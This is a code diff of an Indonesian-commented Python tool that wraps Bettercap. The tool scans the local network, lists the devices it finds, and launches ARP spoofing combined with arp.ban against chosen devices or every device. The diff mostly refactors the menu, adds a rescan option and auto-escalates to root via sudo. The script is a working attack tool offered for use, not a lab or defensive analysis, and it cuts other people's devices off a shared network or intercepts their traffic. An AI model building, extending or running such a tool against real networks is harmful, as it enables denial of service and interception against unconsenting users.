@@ -8,6 +8,7 @@ import re
 import ipaddress
 import tempfile
 
+# ---------- ANSI ----------
 RESET = "\033[0m"
 BOLD = "\033[1m"
 CLEAR = "\033[2J\033[H"
@@ -19,20 +20,24 @@ COLORS = {
     "gray": "\033[90m",
     "cyan": "\033[96m",
     "yellow": "\033[93m",
+    "magenta": "\033[35m",
 }
 
 GLITCH_CHARS = "!@#$%^&*<>/\\|_+=~`"
 
-def pastikan_root():
-    """Otomatis meminta hak akses sudo jika dijalankan tanpa root."""
-    if os.geteuid() != 0:
-        print(f"{COLORS['yellow']}[!] Skrip ini membutuhkan akses root untuk menjalankan Bettercap.{RESET}")
-        print("[*] Mencoba mengalihkan ke sudo otomatis...\n")
-        try:
-            os.execvp("sudo", ["sudo", sys.executable] + sys.argv)
-        except Exception as e:
-            print(f"{COLORS['red']}[[-] Gagal mendapatkan akses sudo: {e}{RESET}")
-            sys.exit(1)
+# ================= LOADING FUNCTION =================
+
+def loading(text, duration=1):
+    """Tampilkan loading sederhana dengan animasi spinner"""
+    chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
+    for i in range(duration * 10):
+        sys.stdout.write(f"\r  {COLORS['yellow']}{BOLD}{chars[i % len(chars)]} {text}{RESET}")
+        sys.stdout.flush()
+        time.sleep(0.1)
+    sys.stdout.write("\r" + " " * 60 + "\r")
+    sys.stdout.flush()
+
+# ================= GLITCH FUNCTIONS =================
 
 def print_glitch_line(text, color=COLORS["green"], cycles=8):
     """Animasi teks gaya glitch satu baris (selesai lalu ganti baris)."""
@@ -57,44 +62,79 @@ def print_glitch_line(text, color=COLORS["green"], cycles=8):
         time.sleep(0.03)
     print(f"\r{color}{text}{RESET}")
 
+def exit_with_glitch():
+    sys.stdout.write(CLEAR)
+    sys.stdout.flush()
+    print_glitch_line("TERMINATING SESSION", COLORS["red"], cycles=14)
+    time.sleep(0.3)
+    print_glitch_line("DISCONNECTING...", COLORS["gray"], cycles=12)
+
+    for _ in range(15):
+        junk = "".join(
+            random.choice(GLITCH_CHARS) if random.random() < 0.5 else " "
+            for _ in range(40)
+        )
+        sys.stdout.write(f"\r{COLORS['red']}{junk}{RESET}")
+        sys.stdout.flush()
+        time.sleep(0.03)
+
+    sys.stdout.write(CLEAR)
+    sys.stdout.flush()
+    time.sleep(0.2)
+    sys.exit(0)
+
+# ================= ROOT CHECK =================
+
+def pastikan_root():
+    """Otomatis meminta hak akses sudo jika dijalankan tanpa root."""
+    if os.geteuid() != 0:
+        print(f"{COLORS['yellow']}[!] Skrip ini membutuhkan akses root untuk menjalankan Bettercap.{RESET}")
+        print("[*] Mencoba mengalihkan ke sudo otomatis...\n")
+        try:
+            os.execvp("sudo", ["sudo", sys.executable] + sys.argv)
+        except Exception as e:
+            print(f"{COLORS['red']}[[-] Gagal mendapatkan akses sudo: {e}{RESET}")
+            sys.exit(1)
+
+# ================= BETTERCAP FUNCTIONS =================
+
 def jalankan_bettercap_otomatis():
-    """Menjalankan net.probe on dengan animasi LOADING... yang terus mengeglitch."""
+    """Menjalankan net.probe on dengan animasi LOADING..."""
     devices = []
     bettercap_cmds = "net.probe on; sleep 3; net.show; quit"
     cmd = ["bettercap", "-silent", "-eval", bettercap_cmds]
     
+    # Tampilkan loading
+    loading("Memulai Bettercap net.probe...", 1)
+    
     try:
-        # Menggunakan Popen agar proses berjalan di background dan Python bisa membuat animasi
         process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
         
-        base_text = "LOADING"
+        base_text = "SCANNING NETWORK"
         dots = ""
         counter = 0
         
-        # Loop ini akan terus berjalan selama proses Bettercap masih aktif (.poll() bernilai None)
+        # Loop animasi loading selama Bettercap berjalan
         while process.poll() is None:
             counter += 1
             if counter % 5 == 0:
-                dots = "." * ((counter // 5) % 4)  # Membuat animasi titik berjalan (...)
+                dots = "." * ((counter // 5) % 4)
             
-            # Membuat efek teks LOADING mengeglitch secara acak per frame
             glitched_loading = []
-            full_string = f">> {base_text}{dots}"
+            full_string = f"  {base_text}{dots}"
             
             for char in full_string:
-                if char in [">", " "] :
+                if char in [" ", ">"]:
                     glitched_loading.append(char)
-                elif random.random() < 0.15:  # Peluang 15% karakter berubah jadi glitch char
+                elif random.random() < 0.15:
                     glitched_loading.append(random.choice(GLITCH_CHARS))
                 else:
                     glitched_loading.append(char)
                     
-            # Tulis efek ke terminal menggunakan \r (carriage return) agar menumpuk di baris yang sama
-            sys.stdout.write(f"\r{COLORS['red']}{''.join(glitched_loading)}{RESET}   ")
+            sys.stdout.write(f"\r{COLORS['cyan']}{''.join(glitched_loading)}{RESET}   ")
             sys.stdout.flush()
             time.sleep(0.08)
             
-        # Mengambil output setelah proses selesai
         output, _ = process.communicate()
 
         # Membersihkan kode warna ANSI bawaan Bettercap
@@ -134,17 +174,16 @@ def jalankan_bettercap_otomatis():
         
     return devices
 
-
 def jalankan_arp_attack(targets):
-    """Jalankan Bettercap secara interaktif dan kirim perintah arp.spoof + arp.ban seperti di console asli."""
+    """Jalankan Bettercap secara interaktif dan kirim perintah arp.spoof + arp.ban"""
     if isinstance(targets, list):
         targets = ",".join(targets)
 
     cmd = ["bettercap", "-silent"]
 
-    print(f"\n{COLORS['cyan']}[LIVE] Menjalankan BAN ON...{RESET}")
-    print(f"{COLORS['yellow']}[LIVE] Target: {targets}{RESET}")
-    print(f"{COLORS['gray']}[!] Tekan Ctrl+C untuk menghentikan serangan.{RESET}\n")
+    print(f"\n  {COLORS['cyan']}[LIVE] Menjalankan BAN ON...{RESET}")
+    print(f"  {COLORS['yellow']}[LIVE] Target: {targets}{RESET}")
+    print(f"  {COLORS['gray']}[!] Tekan Ctrl+C untuk menghentikan serangan.{RESET}\n")
 
     try:
         process = subprocess.Popen(
@@ -155,10 +194,10 @@ def jalankan_arp_attack(targets):
             text=True,
         )
     except FileNotFoundError:
-        print(f"\n{COLORS['red']}[!] Error: 'bettercap' tidak ditemukan di sistem Anda.{RESET}")
+        print(f"\n  {COLORS['red']}[!] Error: 'bettercap' tidak ditemukan di sistem Anda.{RESET}")
         sys.exit(1)
     except Exception as e:
-        print(f"\n{COLORS['red']}[!] Terjadi kesalahan saat menjalankan Bettercap: {e}{RESET}")
+        print(f"\n  {COLORS['red']}[!] Terjadi kesalahan saat menjalankan Bettercap: {e}{RESET}")
         sys.exit(1)
 
     try:
@@ -172,7 +211,7 @@ def jalankan_arp_attack(targets):
 
         while True:
             if process.poll() is not None:
-                print(f"\n{COLORS['red']}[!] Bettercap berhenti mendadak.{RESET}")
+                print(f"\n  {COLORS['red']}[!] Bettercap berhenti mendadak.{RESET}")
                 break
 
             text = " BAN ON "
@@ -184,7 +223,7 @@ def jalankan_arp_attack(targets):
                     glitched.append(random.choice(GLITCH_CHARS))
                 else:
                     glitched.append(ch)
-            sys.stdout.write(f"\r{COLORS['red']}[ATTACKING]{''.join(glitched)}{RESET}")
+            sys.stdout.write(f"\r  {COLORS['red']}[ATTACKING]{''.join(glitched)}{RESET}")
             sys.stdout.flush()
             time.sleep(0.4)
 
@@ -210,29 +249,6 @@ def jalankan_arp_attack(targets):
         print_glitch_line("[!] ARP attack dihentikan. Memulihkan target...", COLORS["red"], cycles=20)
         time.sleep(1.5)
         return
-
-
-def exit_with_glitch():
-    sys.stdout.write(CLEAR)
-    sys.stdout.flush()
-    print_glitch_line("TERMINATING SESSION", COLORS["red"], cycles=14)
-    time.sleep(0.3)
-    print_glitch_line("DISCONNECTING...", COLORS["gray"], cycles=12)
-
-    for _ in range(15):
-        junk = "".join(
-            random.choice(GLITCH_CHARS) if random.random() < 0.5 else " "
-            for _ in range(40)
-        )
-        sys.stdout.write(f"\r{COLORS['red']}{junk}{RESET}")
-        sys.stdout.flush()
-        time.sleep(0.03)
-
-    sys.stdout.write(CLEAR)
-    sys.stdout.flush()
-    time.sleep(0.2)
-    sys.exit(0)
-
 
 def parse_target_selection(selection, max_index):
     targets = set()
@@ -262,17 +278,65 @@ def parse_target_selection(selection, max_index):
             targets.add(idx)
     return sorted(targets)
 
+def back_to_bettercap_menu():
+    """Kembali ke bettercap-menu.py"""
+    menu_path = os.path.join(os.path.dirname(__file__), "bettercap-menu.py")
+    if not os.path.exists(menu_path):
+        menu_path = os.path.join(os.path.dirname(__file__), "..", "bettercap-menu.py")
+    if os.path.exists(menu_path):
+        os.execvp(sys.executable, [sys.executable, menu_path])
+    else:
+        print(f"\n  {COLORS['red']}[✗] bettercap-menu.py tidak ditemukan.{RESET}")
+        input("\n  Tekan Enter untuk kembali...")
+
+# ================= DISPLAY TARGETS =================
+
+def display_targets(live_devices):
+    """Tampilkan daftar target dengan format rapi"""
+    sys.stdout.write(CLEAR)
+    sys.stdout.flush()
+    
+    print(f"\n  {COLORS['cyan']}{BOLD}╔══════════════════════════════════════════╗{RESET}")
+    print(f"  {COLORS['cyan']}{BOLD}║{RESET} {COLORS['yellow']}{BOLD}TARGET LIST{RESET}                      {COLORS['cyan']}{BOLD}║{RESET}")
+    print(f"  {COLORS['cyan']}{BOLD}╚══════════════════════════════════════════╝{RESET}\n")
+    
+    print_glitch_line(">> [SYS] NETWORK SCAN COMPLETE.", COLORS["cyan"])
+    print_glitch_line(">> [EXEC] net.show (Displaying discovered targets)", COLORS["bright_green"])
+    
+    print("\n" + "  " + "-" * 61)
+    header = f"{'NO':<5}{'IP ADDRESS':<18}{'MAC ADDRESS':<20}{'VENDOR'}"
+    print(f"  {BOLD}{header}{RESET}")
+    print("  " + "-" * 61)
+    
+    for i, dev in enumerate(live_devices, start=1):
+        line = f"{i:<5}{dev['ip']:<18}{dev['mac']:<20}{dev['vendor']}"
+        print_glitch_line("  " + line, COLORS["green"], cycles=4)
+        
+    print("  " + "-" * 61)
+    all_no = len(live_devices) + 1
+    print(f"  {COLORS['yellow']}{all_no}. TARGET ALL DEVICES{RESET}")
+    print(f"  {COLORS['cyan']}p. PICK TARGETS{RESET}")
+    print(f"  {COLORS['magenta']}r. REFRESH / SCAN ULANG{RESET}\n")
+    print(f"  {COLORS['red']}0. BACK TO MENU{RESET}")
+    print(f"  {COLORS['red']}99. EXIT{RESET}")
+    
+    print()
+    sys.stdout.write(f"  {COLORS['yellow']}>> pilih nomer target: {RESET}")
+    sys.stdout.flush()
+
+# ================= MAIN =================
 
 def run_simulation():
     pastikan_root()
 
-    sys.stdout.write(CLEAR)
-    sys.stdout.flush()
+    # Initial scan
+    print(f"\n  {COLORS['cyan']}{BOLD}╔══════════════════════════════════════════╗{RESET}")
+    print(f"  {COLORS['cyan']}{BOLD}║{RESET} {COLORS['yellow']}{BOLD}BETTERCAP BAN{RESET}                  {COLORS['cyan']}{BOLD}║{RESET}")
+    print(f"  {COLORS['cyan']}{BOLD}╚══════════════════════════════════════════╝{RESET}\n")
     
     print_glitch_line(">> [SYS] STARTING AUTOMATED BETTERCAP INSTANCE...", COLORS["cyan"])
     print_glitch_line(">> [EXEC] net.probe on (Scanning local area network...)", COLORS["bright_green"])
     
-    # Memanggil pencarian network yang memiliki animasi loading glitching
     live_devices = jalankan_bettercap_otomatis()
     
     if not live_devices:
@@ -280,70 +344,67 @@ def run_simulation():
             {"ip": "192.168.1.1", "mac": "00:11:22:33:44:55", "vendor": "Gateway (No other hosts found)"}
         ]
 
-    sys.stdout.write(CLEAR)
-    sys.stdout.flush()
-    print_glitch_line(">> [SYS] NETWORK SCAN COMPLETE.", COLORS["cyan"])
-    print_glitch_line(">> [EXEC] net.show (Displaying discovered targets)", COLORS["bright_green"])
-    
-    print("\n" + "-" * 65)
-    header = f"{'NO':<5}{'IP ADDRESS':<18}{'MAC ADDRESS':<20}{'VENDOR'}"
-    print(f"{BOLD}{header}{RESET}")
-    print("-" * 65)
-    
-    for i, dev in enumerate(live_devices, start=1):
-        line = f"{i:<5}{dev['ip']:<18}{dev['mac']:<20}{dev['vendor']}"
-        print_glitch_line(line, COLORS["green"], cycles=4)
+    while True:
+        display_targets(live_devices)
+        choice = input().strip()
         
-    print("-" * 65)
-    all_no = len(live_devices) + 1
-    print(f"{COLORS['yellow']}{all_no}. TARGET ALL DEVICES{RESET}")
-    print(f"{COLORS['cyan']}p. PICK TARGETS{RESET}\n")
-    print(f"{COLORS['red']}0. BACK TO MENU{RESET}")
-    print(f"{COLORS['red']}99. EXIT{RESET}")
-    
-    sys.stdout.write(f"{COLORS['yellow']}>> pilih nomer target: {RESET}")
-    sys.stdout.flush()
-    choice = input().strip()
-    
-    if choice.lower() == "p":
-        sys.stdout.write(f"{COLORS['yellow']}>> who else the target (contoh: 1-4, 1,3,5): {RESET}")
-        sys.stdout.flush()
-        selection = input().strip()
-        picked = parse_target_selection(selection, len(live_devices))
-        if not picked:
-            print(f"\n{COLORS['red']}Pilihan target tidak valid.{RESET}")
+        # ===== FITUR REFRESH =====
+        if choice.lower() == "r":
+            print(f"\n  {COLORS['cyan']}[*] Me-refresh scan...{RESET}")
+            time.sleep(0.5)
+            
+            # Scan ulang
+            live_devices = jalankan_bettercap_otomatis()
+            
+            if not live_devices:
+                live_devices = [
+                    {"ip": "192.168.1.1", "mac": "00:11:22:33:44:55", "vendor": "Gateway (No other hosts found)"}
+                ]
+            
+            print(f"  {COLORS['green']}[✓] Scan selesai! {len(live_devices)} perangkat ditemukan.{RESET}")
             time.sleep(0.8)
-            return True
-        target_ips = [live_devices[i - 1]['ip'] for i in picked]
-        print(f"\n{COLORS['red']}[LIVE] Target dikunci ke IP: {', '.join(target_ips)}{RESET}")
-        time.sleep(1.0)
-        jalankan_arp_attack(target_ips)
-    elif choice == "0":
-        menu_path = os.path.join(os.path.dirname(__file__), "bettercap-menu.py")
-        if not os.path.exists(menu_path):
-            menu_path = os.path.join(os.path.dirname(__file__), "menu.py")
-        os.execvp(sys.executable, [sys.executable, menu_path])
-    elif choice == "99":
-        exit_with_glitch()
-    elif choice == str(all_no):
-        target_ips = [dev['ip'] for dev in live_devices]
-        print(f"\n{COLORS['red']}[LIVE] Target dikunci ke: SEMUA PERANGKAT{RESET}")
-        time.sleep(1.0)
-        jalankan_arp_attack(target_ips)
-    elif choice.isdigit() and 1 <= int(choice) <= len(live_devices):
-        selected = live_devices[int(choice) - 1]
-        print(f"\n{COLORS['red']}[LIVE] Target dikunci ke IP: {selected['ip']}{RESET}")
-        time.sleep(1.0)
-        jalankan_arp_attack(selected['ip'])
-    else:
-        print(f"\n{COLORS['red']}Pilihan tidak valid.{RESET}")
-        time.sleep(0.8)
-    return True
+            continue  # Kembali ke display target dengan data baru
+            
+        # ===== PILIH TARGET =====
+        elif choice.lower() == "p":
+            sys.stdout.write(f"  {COLORS['yellow']}>> who else the target (contoh: 1-4, 1,3,5): {RESET}")
+            sys.stdout.flush()
+            selection = input().strip()
+            picked = parse_target_selection(selection, len(live_devices))
+            if not picked:
+                print(f"\n  {COLORS['red']}Pilihan target tidak valid.{RESET}")
+                time.sleep(0.8)
+                continue
+            target_ips = [live_devices[i - 1]['ip'] for i in picked]
+            print(f"\n  {COLORS['red']}[LIVE] Target dikunci ke IP: {', '.join(target_ips)}{RESET}")
+            time.sleep(1.0)
+            jalankan_arp_attack(target_ips)
+            
+        elif choice == "0":
+            back_to_bettercap_menu()
+            
+        elif choice == "99":
+            exit_with_glitch()
+            
+        elif choice == str(len(live_devices) + 1):
+            target_ips = [dev['ip'] for dev in live_devices]
+            print(f"\n  {COLORS['red']}[LIVE] Target dikunci ke: SEMUA PERANGKAT{RESET}")
+            time.sleep(1.0)
+            jalankan_arp_attack(target_ips)
+            
+        elif choice.isdigit() and 1 <= int(choice) <= len(live_devices):
+            selected = live_devices[int(choice) - 1]
+            print(f"\n  {COLORS['red']}[LIVE] Target dikunci ke IP: {selected['ip']}{RESET}")
+            time.sleep(1.0)
+            jalankan_arp_attack(selected['ip'])
+            
+        else:
+            print(f"\n  {COLORS['red']}Pilihan tidak valid.{RESET}")
+            time.sleep(0.8)
 
 if __name__ == "__main__":
     try:
-        while run_simulation():
-            pass
+        run_simulation()
     except KeyboardInterrupt:
         print("\n\nAborted.")
         sys.exit(0)
